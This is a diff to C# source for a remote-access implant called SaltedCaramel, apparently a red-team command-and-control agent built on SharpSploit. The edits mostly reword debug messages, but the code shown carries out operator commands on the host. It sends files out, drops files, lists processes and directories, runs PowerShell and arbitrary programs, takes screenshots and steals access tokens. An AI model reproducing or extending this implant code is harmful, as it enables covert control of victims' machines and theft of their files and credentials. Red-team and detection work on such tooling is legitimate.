@@ -37,7 +37,7 @@ namespace SaltedCaramel
         {
             if (this.command == "exit")
             {
-                Debug.WriteLine("[-] Tasked to exit");
+                Debug.WriteLine("[-] DispatchTask - Tasked to exit");
                 try
                 {
                     implant.SendComplete(this.id);
@@ -50,7 +50,7 @@ namespace SaltedCaramel
             }
             else if (this.command == "download")
             {
-                Debug.WriteLine("[-] Tasked to send file " + this.@params);
+                Debug.WriteLine("[-] DispatchTask - Tasked to send file " + this.@params);
                 string file = this.@params;
                 implant.SendFile(this.id, file);
             }
@@ -59,21 +59,19 @@ namespace SaltedCaramel
                 JObject json = (JObject)JsonConvert.DeserializeObject(this.@params);
                 string file_id = json.Value<string>("file_id");
                 string filepath = json.Value<string>("remote_path");
-                Debug.WriteLine("[-] Tasked to get file " + file_id);
+                Debug.WriteLine("[-] DispatchTask - Tasked to get file " + file_id);
                 // If file exists, don't write file
                 if (File.Exists(filepath))
                 {
-                    Debug.WriteLine($"[!] ERROR: File exists: {filepath}");
+                    Debug.WriteLine($"[!] DispatchTask - ERROR: File exists: {filepath}");
                     implant.SendError(this.id, "ERROR: File exists.");
                 }
                 else
-                {
                     implant.GetFile(file_id, filepath, this.id);
-                }
             }
             else if (this.command == "ps")
             {
-                Debug.WriteLine("[-] Tasked to list processes");
+                Debug.WriteLine("[-] DispatchTask - Tasked to list processes");
                 SharpSploitResultList<Host.ProcessResult> processResult = Host.GetProcessList();
                 List<Dictionary<string, string>> procList = new List<Dictionary<string, string>>();
                 foreach (Host.ProcessResult item in processResult)
@@ -107,7 +105,7 @@ namespace SaltedCaramel
             else if (this.command == "ls")
             {
                 string path = this.@params;
-                Debug.WriteLine("[-] Tasked to list directory " + path);
+                Debug.WriteLine("[-] DispatchTask - Tasked to list directory " + path);
                 SharpSploitResultList<Host.FileSystemEntryResult> list;
 
                 try
@@ -145,12 +143,13 @@ namespace SaltedCaramel
                 }
                 catch (DirectoryNotFoundException)
                 {
+                    Debug.WriteLine($"[!] DispatchTask - ERROR: Directory not found: {path}");
                     implant.SendError(this.id, "Error: Directory not found.");
                 }
             }
             else if (this.command == "powershell")
             {
-                Debug.WriteLine("[-] Tasked to run powershell");
+                Debug.WriteLine("[-] DispatchTask - Tasked to run powershell");
                 string args = this.@params;
 
                 string result = Shell.PowerShellExecute(args);
@@ -166,9 +165,7 @@ namespace SaltedCaramel
                 string argString = string.Join(" ", split.Skip(1).ToArray());
                 ProcessStartInfo startInfo = new ProcessStartInfo();
                 if (implant.hasAlternateToken() == true)
-                {
                     startInfo.WorkingDirectory = "C:\\Temp";
-                }
                 startInfo.FileName = split[0];
                 startInfo.Arguments = argString;
                 startInfo.UseShellExecute = false;
@@ -181,7 +178,7 @@ namespace SaltedCaramel
                 string procOutput = "";
                 try
                 {
-                    Debug.WriteLine("[-] Tasked to start process " + startInfo.FileName);
+                    Debug.WriteLine("[-] DispatchTask - Tasked to start process " + startInfo.FileName);
                     proc.Start();
 
                     while (!proc.StandardOutput.EndOfStream)
@@ -200,12 +197,13 @@ namespace SaltedCaramel
                 }
                 catch (Exception e)
                 {
+                    Debug.WriteLine("[!] DispatchTask - ERROR starting process: " + e.Message);
                     implant.SendError(this.id, e.Message);
                 }
             }
             else if (this.command == "screencapture")
             {
-                Debug.WriteLine("[-] Tasked to take screenshot.");
+                Debug.WriteLine("[-] DispatchTask - Tasked to take screenshot.");
                 Rectangle bounds = Screen.GetBounds(Point.Empty);
                 Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
                 Graphics g = Graphics.FromImage(bm);
@@ -230,18 +228,15 @@ namespace SaltedCaramel
                 }
                 catch
                 {
+                    Debug.WriteLine("[!] DispatchTask - ERROR sleep value provided was not int");
                     implant.SendError(this.id, "ERROR: argument provided was not an int.");
                 }
             }
             else if (this.command == "steal_token")
-            {
                 // EXPERIMENTAL - doesn't quite work yet
                 Token.StealToken(780);
-            }
             else if (this.command == "reset_token")
-            {
                 Token.stolenHandle = IntPtr.Zero;
-            }
         }
     }
 }
